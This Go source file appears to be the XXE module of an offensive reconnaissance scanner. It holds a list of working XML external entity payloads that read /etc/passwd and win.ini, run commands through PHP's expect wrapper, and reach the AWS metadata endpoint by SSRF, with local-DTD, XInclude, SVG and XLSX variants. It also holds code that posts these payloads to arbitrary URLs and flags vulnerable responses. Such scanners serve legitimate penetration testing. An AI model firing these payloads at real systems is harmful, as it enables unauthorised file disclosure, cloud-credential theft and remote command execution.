package xxe

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"

	"github.com/a0x194/recon-hunter/internal/config"
	"github.com/a0x194/recon-hunter/internal/types"
	"github.com/a0x194/recon-hunter/internal/utils"
)

// XXE payloads for testing
var xxePayloads = []struct {
	payload     string
	indicator   string
	description string
	blind       bool
}{
	// Basic XXE - Linux
	{
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`,
		"root:",
		"Basic XXE - /etc/passwd",
		false,
	},
	// Basic XXE - Windows
	{
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>`,
		"[fonts]",
		"Basic XXE - Windows win.ini",
		false,
	},
	// Parameter entity XXE
	{
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>`,
		"root:",
		"Parameter entity XXE",
		false,
	},
	// PHP wrapper XXE
	{
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>`,
		"cm9vdD",
		"PHP filter XXE (base64)",
		false,
	},
	// Expect wrapper XXE
	{
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>`,
		"uid=",
		"PHP expect XXE (RCE)",
		false,
	},
	// SSRF via XXE
	{
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>`,
		"ami-id",
		"XXE to SSRF - AWS metadata",
		false,
	},
	// Local DTD exploitation
	{
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<root>test</root>`,
		"root:",
		"Local DTD XXE",
		false,
	},
	// UTF-16 encoded XXE
	{
		`<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
		"root:",
		"UTF-16 encoded XXE",
		false,
	},
	// CDATA exfiltration
	{
		`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "data://text/plain;base64,PCFFTlRJVFkgam9pbmVkICIlc3RhcnQ7JWZpbGU7JWVuZDsiPg==">
  %dtd;
]>
<root>&joined;</root>`,
		"root:",
		"CDATA XXE exfiltration",
		false,
	},
	// XInclude attack
	{
		`<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>`,
		"root:",
		"XInclude attack",
		false,
	},
	// SVG XXE
	{
		`<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>`,
		"",
		"SVG XXE",
		false,
	},
	// XLSX XXE (in docProps/core.xml)
	{
		`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cp:coreProperties [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties">
<dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">&xxe;</dc:creator>
</cp:coreProperties>`,
		"root:",
		"XLSX/DOCX XXE",
		false,
	},
}

// Content types that might process XML
var xmlContentTypes = []string{
	"application/xml",
	"text/xml",
	"application/xhtml+xml",
	"image/svg+xml",
	"application/soap+xml",
	"application/rss+xml",
	"application/atom+xml",
	"application/mathml+xml",
	"application/xslt+xml",
}

// Scan performs XXE scanning
func Scan(urls []string, cfg *config.Config) ([]types.VulnResult, error) {
	var results []types.VulnResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	client := utils.HTTPClient(cfg.Timeout, cfg.Proxy, true)
	sem := make(chan struct{}, cfg.Threads)

	for _, urlStr := range urls {
		wg.Add(1)
		sem <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			vulns := testXXE(u, client)
			if len(vulns) > 0 {
				mu.Lock()
				results = append(results, vulns...)
				mu.Unlock()
			}
		}(urlStr)
	}

	wg.Wait()
	return results, nil
}

func testXXE(urlStr string, client *http.Client) []types.VulnResult {
	var results []types.VulnResult

	// Test each XXE payload with different content types
	for _, contentType := range xmlContentTypes {
		for _, test := range xxePayloads {
			if test.blind {
				continue // Skip blind XXE for now
			}

			result := testPayload(urlStr, test.payload, test.indicator, test.description, contentType, client)
			if result != nil {
				results = append(results, *result)
				return results // Found XXE, no need to test more
			}
		}
	}

	return results
}

func testPayload(urlStr, payload, indicator, description, contentType string, client *http.Client) *types.VulnResult {
	req, err := http.NewRequest("POST", urlStr, bytes.NewBufferString(payload))
	if err != nil {
		return nil
	}

	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Accept", "*/*")

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	bodyStr := string(body)

	// Check for indicator
	if indicator != "" && strings.Contains(bodyStr, indicator) {
		return &types.VulnResult{
			Type:        "XML External Entity (XXE) Injection",
			Severity:    "critical",
			URL:         urlStr,
			Payload:     truncatePayload(payload),
			Evidence:    fmt.Sprintf("Indicator '%s' found in response. Content-Type: %s", indicator, contentType),
			Description: description,
			Remediation: "Disable external entity processing in XML parsers. Use less complex data formats (JSON). If XML is necessary, disable DTDs entirely.",
			References: []string{
				"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
				"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
			},
		}
	}

	// Check for error-based XXE indicators
	errorIndicators := []string{
		"SYSTEM", "ENTITY", "DOCTYPE",
		"XML parsing error", "XML syntax error",
		"parser error", "DOMDocument",
		"simplexml", "XMLReader",
		"SAXParseException", "xerces",
		"org.xml.sax", "javax.xml",
	}

	for _, errInd := range errorIndicators {
		if strings.Contains(bodyStr, errInd) {
			return &types.VulnResult{
				Type:        "XML External Entity (XXE) - Potential",
				Severity:    "medium",
				URL:         urlStr,
				Payload:     truncatePayload(payload),
				Evidence:    fmt.Sprintf("XML error indicator '%s' found. May be vulnerable to XXE.", errInd),
				Description: "XML parser error suggests XXE vulnerability may be present",
				Remediation: "Investigate XML processing configuration. Disable external entities.",
				References: []string{
					"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
				},
			}
		}
	}

	return nil
}

func truncatePayload(payload string) string {
	if len(payload) > 200 {
		return payload[:200] + "..."
	}
	return payload
}

// ScanUploadEndpoints scans file upload endpoints for XXE
func ScanUploadEndpoints(urls []string, cfg *config.Config) ([]types.VulnResult, error) {
	var results []types.VulnResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	client := utils.HTTPClient(cfg.Timeout, cfg.Proxy, true)
	sem := make(chan struct{}, cfg.Threads)

	// Filter for potential upload endpoints
	uploadPatterns := []string{
		"upload", "import", "file", "document", "xml",
		"excel", "xlsx", "docx", "pdf", "image", "svg",
	}

	for _, urlStr := range urls {
		urlLower := strings.ToLower(urlStr)
		isUploadEndpoint := false
		for _, pattern := range uploadPatterns {
			if strings.Contains(urlLower, pattern) {
				isUploadEndpoint = true
				break
			}
		}

		if !isUploadEndpoint {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			vulns := testXXE(u, client)
			if len(vulns) > 0 {
				mu.Lock()
				results = append(results, vulns...)
				mu.Unlock()
			}
		}(urlStr)
	}

	wg.Wait()
	return results, nil
}
